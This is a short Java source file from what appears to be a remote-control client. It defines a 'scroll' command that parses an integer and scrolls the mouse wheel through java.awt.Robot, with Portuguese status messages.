package br.com.introcdc.connect.client.commands.control;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:21
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ControlComponents;

public class ClientCommandMouseScroll extends ClientCommand {

    public ClientCommandMouseScroll() {
        super("scroll");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        try {
            int scroll = Integer.parseInt(input);
            ControlComponents.ROBOT_INSTANCE.mouseWheel(scroll);
            msg("Movimentado o scroll em " + scroll + "!");
        } catch (Exception ignored) {
            msg("Digite um número válido!");
        }
    }

}
